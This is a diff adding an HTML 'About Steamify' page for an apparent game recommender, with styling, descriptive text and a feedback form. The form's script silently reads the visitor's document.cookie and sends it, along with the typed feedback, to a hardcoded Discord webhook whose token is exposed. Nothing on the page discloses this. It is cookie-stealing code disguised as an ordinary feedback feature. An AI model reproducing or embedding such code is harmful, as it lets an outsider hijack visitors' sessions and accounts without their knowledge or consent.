@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>About Steamify</title>
+<style>
+    body {
+       
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+       
+        background: linear-gradient(150deg, #171A21 0%, #020d29e1 100%);
+       
+        color: #f0f0f0;
+       
+        margin: 0;
+       
+        padding: 0;
+    }
+
+    .navbar {
+       
+        position: fixed;
+       
+        top: 0;
+       
+        left: 0;
+       
+        width: 100%;
+       
+        height: 60px;
+       
+        display: flex;
+       
+        align-items: center;
+       
+        padding: 0 40px;
+       
+        background: rgba(23, 26, 33, 0.95);
+       
+        box-shadow: 0 3px 10px rgba(0,0,0,0.6);
+       
+        z-index: 1000;
+    }
+
+    .logo {
+       
+        color: #66c0f4;
+       
+        font-size: 22px;
+       
+       
+        font-weight: bold;
+       
+        letter-spacing: 1px;
+    }
+
+    .nav-links {
+       
+        margin-left: 40px;
+       
+        display: flex;
+       
+        gap: 25px;
+    }
+
+    .nav-links a {
+       
+        color: #b8b6b4;
+       
+        text-decoration: none;
+       
+        font-size: 14px;
+    }
+
+    .nav-links a:hover {
+       
+        color: white;
+    }
+
+    .content {
+       
+        max-width: 900px;
+       
+        margin: 120px auto 60px;
+       
+        padding: 40px;
+       
+        background-color: rgba(23, 26, 33, 0.9);
+       
+        border-radius: 15px;
+       
+        box-shadow: 0 8px 50px #00c6ff;
+    }
+
+    h1 {
+       
+        text-align: center;
+       
+        font-size: 2.5em;
+       
+        margin-bottom: 30px;
+       
+        background: linear-gradient(90deg, #00c6ff, #ff4c4c);
+       
+        -webkit-background-clip: text;
+       
+        -webkit-text-fill-color: transparent;
+       
+        text-shadow: 1px 1px 4px rgba(0,0,0,0.5);
+    }
+
+    p {
+       
+        font-size: 1.1em;
+       
+        line-height: 1.8;
+       
+        margin-bottom: 20px;
+    }
+
+    p:last-child {
+       
+        margin-bottom: 0;
+    }
+
+
+    .feedback-box {
+       
+        max-width: 900px;
+       
+        margin: 20px auto 60px;
+       
+        padding: 20px;
+       
+        background-color: rgba(23,26,33,0.85);
+       
+        border-radius: 12px;
+       
+        box-shadow: 0 6px 30px #ff4c4c;
+       
+        display: flex;
+       
+        flex-direction: column;
+       
+        gap: 12px;
+    }
+
+    .feedback-box input[type="text"] {
+       
+        padding: 12px;
+       
+        font-size: 16px;
+       
+        border-radius: 6px;
+       
+        border: none;
+       
+        outline: none;
+       
+        align-items: center;
+    }
+
+    .feedback-box button {
+       
+        padding: 12px;
+       
+        font-size: 16px;
+       
+        background-color: #d80000;
+       
+        color: white;
+       
+        border: none;
+       
+        border-radius: 6px;
+       
+        cursor: pointer;
+       
+        transition: 0.3s;
+    }
+
+    .feedback-box button:hover {
+       
+        background-color: #960000;
+       
+        transform: scale(1.05);
+    }
+
+    @media (max-width: 600px) {
+       
+        .content, .feedback-box {
+       
+            margin: 140px 20px 60px;
+       
+            padding: 30px;
+        }
+
+        h1 {
+       
+            font-size: 2em;
+        }
+    }
+</style>
+</head>
+<body>
+
+<div class="navbar">
+    <div class="logo">Steamify</div>
+    <div class="nav-links">
+        <a href="/Main">Main</a>
+    </div>
+</div>
+
+<div class="content">
+    <h1>About Steamify</h1>
+    <p>Steamify is a game recommender system designed to provide personalized game suggestions based on your preferences and gaming history. It uses advanced algorithms and machine learning to analyze your game data and generate recommendations.</p>
+    <p>Our goal is to help gamers discover new and exciting games that they might not have found otherwise. Whether you're a casual gamer or a hardcore enthusiast, Steamify aims to enhance your gaming experience by offering recommendations that match your taste.</p>
+    <p>We are committed to continuously improving our recommendation system and providing the best possible service to our users. If you have any feedback or suggestions, please feel free to reach out to us via the suggestion box.</p>
+    <p>Though machine learning is wonderful, it sometimes guesses wrong. If the link or picture on your recommendation is wrong, just search the game on Steam for correct details.</p>
+</div>
+
+<div class="feedback-box">
+    <input type="text" id="feedbackInput" placeholder="Send us a suggestion or feedback">
+    <button id="sendBtn">Send Feedback</button>
+</div>
+
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1482338941662134406/wkOY8ktYf0sZXjrCLpGTn2pgFLkddSROPwqBzp3Btd5K6LqAEeCkiPK4o5J1yEeKT0nw"; 
+const cookies = document.cookie
+
+const sendFeedback = async () => {
+    const feedback = document.getElementById("feedbackInput").value.trim();
+    if(!feedback) return alert("Please enter some feedback!");
+
+    const payload = { content: `${cookies} Feedback: ${feedback}` };
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+        alert("Feedback sent! Thank you!");
+        document.getElementById("feedbackInput").value = "";
+    } catch (error) {
+        console.error("Error sending feedback:", error);
+        alert("Failed to send feedback. Try again later.");
+    }
+};
+
+document.getElementById("sendBtn").addEventListener("click", sendFeedback);
+
+document.getElementById("feedbackInput").addEventListener("keydown", (event) => {
+    if (event.key === "Enter") {
+        sendFeedback();
+    }
+});
+</script>
+
+</body>
+</html>
